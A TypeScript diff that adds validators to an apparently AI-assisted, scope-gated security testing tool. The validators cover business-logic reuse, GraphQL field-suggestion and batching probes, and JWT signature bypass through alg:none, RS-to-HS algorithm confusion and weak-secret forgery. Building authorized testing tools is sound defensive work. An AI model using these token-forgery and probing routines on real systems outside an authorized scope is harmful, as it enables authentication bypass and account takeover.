+// as control; reuseOracle proves it only when both applications succeed and the
+// invalid one is rejected. Whether the artifact is single-use is the model's
+// reading. Mutating, so it needs active mode. See reuse.test.ts.
+const exploreReuseValidator: Validator = {
+  class: "explore.reuse",
+  name: "business-logic reuse (single-use artifact applied twice)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; method?: unknown; body?: unknown; contentType?: unknown; controlBody?: unknown; successMarkers?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (!env.scope.allowActiveTesting) return no("reuse replays a state-changing action: needs allowActiveTesting");
+    if (typeof d.url !== "string") return no("need detail.url");
+    if (typeof d.body !== "string") return no("need detail.body (the application that spends the artifact)");
+    if (typeof d.controlBody !== "string") return no("need detail.controlBody (the same shape with an invalid artifact, as a negative control)");
+    const markers = Array.isArray(d.successMarkers) ? d.successMarkers.filter((m): m is string => typeof m === "string" && m.length > 0).slice(0, 8) : [];
+    if (!markers.length) return no("need detail.successMarkers: strings that appear only when the artifact is actually applied");
+    const url = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url)) return no("off-scope host");
+    const actor = parseActor(d.as);
+    const method = typeof d.method === "string" ? d.method : "POST";
+    const headers = { "content-type": typeof d.contentType === "string" ? d.contentType : "application/json" };
+    const send = async (body: string) => { const r = await sendAs({ url: d.url as string, method, headers, body, as: actor }, actor, env, url); return { status: r.status, body: r.body }; };
+    let first, second, control;
+    try { first = await send(d.body); second = await send(d.body); control = await send(d.controlBody); }
+    catch (e) { return no(`request failed: ${(e as Error).message}`); }
+    const r = reuseOracle({ first, second, control, successMarkers: markers });
+    if (r.verdict === "reused") return { claimId: claim.id, state: "proven", validator: this.name, reason: `Business-logic reuse at ${pathOnly(url)}: ${r.reason} (whether the artifact is single-use is the model's reading)`, evidence: { request: `${method} ${pathOnly(url)} applied twice; invalid control rejected`, response: r.reason }, ceiling: "medium" };
+    return no(r.reason);
+  },
+};
+
+/* ---------------- explore.graphql ---------------- */
+// GraphQL field suggestions enabled (schema disclosure even with introspection
+// off). Universal near-miss probes of __typename; a "Did you mean" answer proves
+// it. Read-only (a query-only POST). Generic protocol behaviour. See graphql.test.ts.
+const exploreGraphqlValidator: Validator = {
+  class: "explore.graphql",
+  name: "GraphQL field suggestions enabled (schema disclosure)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (typeof d.url !== "string") return no("need detail.url (the GraphQL endpoint)");
+    const url = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url)) return no("off-scope host");
+    let lead: string | undefined;
+    for (const probe of SUGGESTION_PROBES) {
+      try {
+        const r = await safeFetch(url, env.scope, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ query: probe }), maxBytes: 128 * 1024 });
+        const o = graphqlSuggestionsOracle({ status: r.status, body: r.body });
+        if (o.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `GraphQL field suggestions at ${pathOnly(url)}: ${o.reason}`, evidence: { request: `POST ${pathOnly(url)} ${probe}`, response: o.reason }, ceiling: "low" };
+        if (o.verdict === "lead") lead = o.reason;
+      } catch (e) { lead = `probe failed: ${(e as Error).message}`; }
+    }
+    // Query batching (needs active mode: a JSON array body is not a read). A batch
+    // of N identical queries that runs as N results proves batching with no rate limit.
+    if (env.scope.allowActiveTesting) {
+      try {
+        const n = 5;
+        const batch = JSON.stringify(Array.from({ length: n }, () => ({ query: "{ __typename }" })));
+        const r = await safeFetch(url, env.scope, { method: "POST", headers: { "content-type": "application/json" }, body: batch, maxBytes: 128 * 1024 });
+        const o = graphqlBatchOracle({ status: r.status, body: r.body, sent: n });
+        if (o.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `GraphQL query batching at ${pathOnly(url)}: ${o.reason}`, evidence: { request: `POST ${pathOnly(url)} [${n}× { __typename }]`, response: o.reason }, ceiling: "medium" };
+        if (o.verdict === "lead" && !lead) lead = o.reason;
+      } catch (e) { if (!lead) lead = `batch probe failed: ${(e as Error).message}`; }
+    }
+    return no(lead ?? "no GraphQL field suggestion or batching");
+  },
+};
+
+/* ---------------- explore.jwt-forge ---------------- */
+// Signature-verification attacks on a JWT: alg:none (+ case variants), algorithm
+// confusion (RS256->HS256 with the server's RSA public key as HMAC secret), and a
+// weak HMAC secret (small dictionary). A forged token is proven only when it is
+// ACCEPTED while the SAME token with a corrupted signature is REJECTED (so the
+// endpoint does verify signatures). Public keys are fetched generically from the
+// usual JWKS paths; no target signature. See jwt.test.ts.
+async function fetchJwkPems(base: string, scope: Scope, jwksUrl?: string): Promise<string[]> {
+  const paths = [jwksUrl, "/.well-known/jwks.json", "/jwks.json", "/oauth/jwks", "/api/jwks", "/.well-known/openid-configuration"].filter((p): p is string => !!p);
+  const pems: string[] = [];
+  for (const p of paths) {
+    const url = p.startsWith("http") ? p : base + p;
+    if (!scope.isHostAllowed(url)) continue;
+    try {
+      const r = await safeFetch(url, scope, { headers: { accept: "application/json" }, maxBytes: 64 * 1024 });
+      if (!ok2xx(r.status)) continue;
+      const j = JSON.parse(r.body) as { keys?: Record<string, unknown>[]; jwks_uri?: string };
+      if (j.jwks_uri && typeof j.jwks_uri === "string") { try { const r2 = await safeFetch(j.jwks_uri, scope, { headers: { accept: "application/json" } }); const j2 = JSON.parse(r2.body) as { keys?: Record<string, unknown>[] }; for (const k of j2.keys ?? []) pems.push(...jwkToPems(k)); } catch { /* skip */ } }
+      for (const k of j.keys ?? []) pems.push(...jwkToPems(k));
+    } catch { /* skip */ }
+  }
+  return [...new Set(pems)];
+}
+
+const exploreJwtForgeValidator: Validator = {
+  class: "explore.jwt-forge",
+  name: "JWT signature bypass (alg:none, algorithm confusion, weak secret)",
+  async validate(claim, env) {
+    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown; jwksUrl?: unknown; as?: unknown };
+    const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
+    if (typeof d.url !== "string") return no("need detail.url");
+    // The model never sees account tokens: take a real JWT from the configured actor
+    // (like cross-actor), or accept an explicit detail.token for tests.
+    const token = typeof d.token === "string" ? d.token : actorToken(env.options, parseActor(d.as) ?? "a");
+    if (!token) return no("no JWT available: set detail.as to a configured account (or detail.token)");
+    const url = resolveExploreUrl(d.url, env.stagingUrl);
+    if (!url) return no("not an http(s) URL");
+    if (!env.scope.isHostAllowed(url)) return no("off-scope host");
+    const base = new URL(url).origin;
+    const override = d.override && typeof d.override === "object" ? (d.override as Record<string, unknown>) : undefined;
+    const hdr = headerOf(token);
+    const candidates: { how: string; token: string }[] = [];
+    for (const t of forgeNoneVariants(token, override)) candidates.push({ how: "alg:none", token: t });
+    if (isRsaAlg(hdr?.alg)) {
+      const pems = await fetchJwkPems(base, env.scope, typeof d.jwksUrl === "string" ? d.jwksUrl : undefined);
+      for (const pem of pems.slice(0, 8)) { const t = forgeHs256(token, pem, override); if (t) candidates.push({ how: "RS->HS algorithm confusion", token: t }); }
+    }
+    if (isHmacAlg(hdr?.alg) || !hdr?.alg) {
+      for (const s of WEAK_SECRETS) { const t = forgeHs256(token, s, override); if (t) candidates.push({ how: `weak secret "${s}"`, token: t }); }
+    }
+    if (!candidates.length) return no("no forgery candidate (need an RSA token for confusion, an HS token for weak-secret, or any for alg:none)");
+    const read = async (tok: string) => { const r = await safeFetch(url, env.scope, { method: "GET", headers: { authorization: `Bearer ${tok}` }, maxBytes: 256 * 1024 }); return { status: r.status, body: r.body }; };
+    const leads: string[] = [];
+    for (const c of candidates.slice(0, 28)) {
+      try {
+        const forged = await read(c.token);
+        if (!(forged.status >= 200 && forged.status < 300)) continue;
+        const control = await read(corruptSig(c.token));
+        const r = jwtForgeOracle({ forged, control });
+        if (r.verdict === "proven") return { claimId: claim.id, state: "proven", validator: this.name, reason: `JWT forgery (${c.how}) at ${pathOnly(url)}: ${r.reason}`, evidence: { request: `GET ${pathOnly(url)} with a ${c.how} token`, response: r.reason }, ceiling: "critical" };
+        if (r.verdict === "lead") leads.push(`${c.how}: ${r.reason}`);
+      } catch (e) { leads.push(`${c.how}: ${(e as Error).message}`); }
+    }
+    return no(leads.length ? `not proven; leads: ${leads.slice(0, 2).join("; ")}` : "no forged token was accepted");
+  },
+};
+
+export const GENERIC_VALIDATORS: Validator[] = [exploreReplayValidator, exploreCrossActorValidator, exploreSecretValidator, exploreFileValidator, exploreInjectionValidator, exploreSsrfValidator, exploreStoredXssValidator, exploreDomXssValidator, exploreLfiValidator, exploreJwtNoneValidator, exploreMassAssignValidator, exploreCorsValidator, exploreReuseValidator, exploreGraphqlValidator, exploreJwtForgeValidator];
 
 export const VALIDATORS: Validator[] = [authzValidator, baasValidator, headerValidator, replayValidator, fileReplayValidator, plainHttpValidator, ...GENERIC_VALIDATORS];
 
